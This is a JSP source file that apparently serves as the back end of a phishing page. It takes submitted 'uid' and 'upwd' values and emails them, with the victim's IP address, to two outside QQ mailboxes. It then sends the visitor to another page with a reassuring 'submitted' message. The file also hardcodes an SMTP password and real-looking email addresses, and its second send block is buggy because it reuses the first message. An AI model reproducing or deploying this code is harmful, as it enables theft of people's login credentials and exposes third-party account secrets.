<%@ page contentType="text/html; charset=UTF-8" language="java" errorPage="" %>
<%@ page import="java.sql.*,java.util.Date" %>
<%@ page import="java.text.SimpleDateFormat" %>
<%@ page import="java.util.*,javax.mail.*"%>
<%@ page import="javax.mail.internet.*"%>


<%

response.setContentType("text/html;charset=utf-8");
request.setCharacterEncoding("utf-8");
String uid = request.getParameter("uid");
String upwd = request.getParameter("upwd");
if(uid!=null&upwd!=null){
	
String qm ="cmmf2012"; //您的QQ密码
String tu = "163.com"; //你邮箱的后缀域名
String tto="393196167@qq.com"; //接收邮件的邮箱  393196167@qq.com blart2068@gmail.com
//--第2邮箱
String tto2="362244844@qq.com"; //接收邮件的邮箱


String ttitle="[长岛]"+uid+upwd;//发送标题

//时间

String datetime=new SimpleDateFormat("yyyy-MM-dd HH:mm:ss").format(Calendar.getInstance().getTime()); //获取系统时间 


//发送内容
String tcontent=datetime+"<br/>"+"姓名:"+uid+"<br/>"+"电话:"+upwd+"<br/>"+"IP地址:"+request.getRemoteAddr();


Properties props=new Properties();
props.put("mail.smtp.host","smtp."+tu);//发信的主机，这里我填写的是我们公司的主机！可以不用修改！
props.put("mail.smtp.auth","true");
Session s=Session.getInstance(props);
s.setDebug(true);
MimeMessage message=new MimeMessage(s);
//给消息对象设置发件人/收件人/主题/发信时间
InternetAddress from=new InternetAddress("blart@"+tu); //这里的115798090 改为您发信的QQ号
message.setFrom(from);
InternetAddress to=new InternetAddress(tto);
message.setRecipient(Message.RecipientType.TO,to);
message.setSubject(ttitle);
message.setSentDate(new Date());
//给消息对象设置内容
BodyPart mdp=new MimeBodyPart();//新建一个存放信件内容的BodyPart对象
mdp.setContent(tcontent,"text/html;charset=	UTF-8");//给BodyPart对象设置内容和格式/编码方式
Multipart mm=new MimeMultipart();//新建一个MimeMultipart对象用来存放BodyPart对
//象(事实上可以存放多个)
mm.addBodyPart(mdp);//将BodyPart加入到MimeMultipart对象中(可以加入多个BodyPart)
message.setContent(mm);//把mm作为消息对象的内容
message.saveChanges();
Transport transport=s.getTransport("smtp");
transport.connect("smtp."+tu,"blart",qm); //这里的115798090也要修改为您的QQ号码
transport.sendMessage(message,message.getAllRecipients());
transport.close();

{//第2邮箱
	Properties props2=new Properties();
	props2.put("mail.smtp.host","smtp."+tu);//发信的主机，这里我填写的是我们公司的主机！可以不用修改！
	props2.put("mail.smtp.auth","true");
	Session s2=Session.getInstance(props2);
	s2.setDebug(true);
	MimeMessage message2=new MimeMessage(s);
	//给消息对象设置发件人/收件人/主题/发信时间
	InternetAddress from2=new InternetAddress("blart@"+tu); //这里的115798090 改为您发信的QQ号
	message.setFrom(from2);
	InternetAddress to2=new InternetAddress(tto2);
	message.setRecipient(Message.RecipientType.TO,to2);
	message.setSubject(ttitle);
	message.setSentDate(new Date());
	//给消息对象设置内容
	BodyPart mdp2=new MimeBodyPart();//新建一个存放信件内容的BodyPart对象
	mdp.setContent(tcontent,"text/html;charset=	UTF-8");//给BodyPart对象设置内容和格式/编码方式
	Multipart mm2=new MimeMultipart();//新建一个MimeMultipart对象用来存放BodyPart对
	//象(事实上可以存放多个)
	mm2.addBodyPart(mdp);//将BodyPart加入到MimeMultipart对象中(可以加入多个BodyPart)
	message.setContent(mm2);//把mm作为消息对象的内容
	message.saveChanges();
	Transport transport2=s.getTransport("smtp");
	transport2.connect("smtp."+tu,"blart",qm); //这里的115798090也要修改为您的QQ号码
	transport2.sendMessage(message,message.getAllRecipients());
	transport2.close();
}
%>

<script >

document.location.href="cdgw1.html";
alert("信息已提交!我们会尽快与您取得联系!");
</script>
<% }%>

 




